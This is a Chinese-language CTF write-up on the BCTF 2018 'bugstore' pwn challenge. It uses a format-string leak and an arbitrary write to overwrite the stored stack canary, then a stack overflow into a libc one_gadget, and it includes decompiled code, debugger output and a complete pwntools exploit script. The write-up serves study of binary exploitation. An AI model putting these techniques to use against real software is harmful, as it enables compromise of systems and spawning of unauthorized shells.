---
title: BCTF bugstore
date: 2018-09-30 00:00:00
categories:
- Pwn
tags: Pwn
---

## bugstore

很直白的给了三个漏洞，栈溢出，格式化字符串，任意地址写固定值，而且每个漏洞只能用一次

```c
int sub_C62()
{
  if ( flag )
    return puts("ain't it cool, bye now");
  flag = 1;
  read(0, &bss_data_0, 0x200uLL);
  return _printf_chk(1LL, (__int64)&bss_data_0);
}
```

格式化字符串这里用了printf_chk，但是地址泄露不影响

```c
int sub_D0E()
{
  int result; // eax

  if ( byte_202048 )
    return puts("ain't it cool, bye now");
  byte_202048 = 1;
  _isoc99_scanf("%llu", &addr);
  result = addr;
  *(_QWORD *)addr = 'EROTSGUB';
  return result;
}
```

任意地址写bugstore，八个字节，想到改写canary，之后栈溢出一把梭

问题是怎么搞到地址，直接格式化字符串泄露就好了

```
    '0x200\n'
    '0x7feed7135260\n'
    '0x7feed7639700\n'
    '0xd\n'
    '0x555d539d1df0\n'
    '0x555d539d1dd8\n'
    '0x7fff16740a46\n'
    '0xa8257cf249f78900\n'
    '(nil)\n'
    '0x7feed705e830\n'
    '0x7fff167448a8\n'
    '0x7fff167448a8\n'
    '0x1d71ca608\n'
    '0x555d539d1d61\n'
    '(nil)\n'

```

第八个就是canary了

```
pwndbg> find 0xa8257cf249f78900
Searching for '0xa8257cf249f78900' in: None ranges
Found 3 results, display max 3 items:
 mapped : 0x7feed7639728 --> 0xa8257cf249f78900 
[stack] : 0x7fff16744798 --> 0xa8257cf249f78900 
[stack] : 0x7fff167447b8 --> 0xa8257cf249f78900 
```

mapped那里就是存储canary的地方

打印出来的地址第三个离得很近，直接把BUGSTORE写进去就好了

exp:

```python
from pwn import *
context.log_level = 'debug'
io = process('./bugstore')
elf = ELF('bugstore')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def p():
	gdb.attach(io)
	raw_input()

io.recvuntil(':')
io.sendline('F')
payload = '%p\n'* 100

io.sendline(payload)
info = io.recvuntil('(F)')
info = str(info).strip('\n').split('\n')
canary_addr = int(info[2],16)+0x28
libc_base = int(info[9],16) - 240 - libc.symbols['__libc_start_main']
p()
io.recvuntil(':')
io.sendline('A')
io.sendline(str(canary_addr))
io.recvuntil(':')
io.sendline('S')
payload = 'A'*0x28 + 'BUGSTORE' + 'A'*8 + p64(libc_base +0x45216)
io.sendline(payload)
io.interactive()
```

编写的时候还是有一点坑的。。主要就是\x00字符截断，因为当时想满足onegadget环境变量需求就忘记截断这回事了，之后用了一个rax==null的gadget竟然直接就可以用，神奇。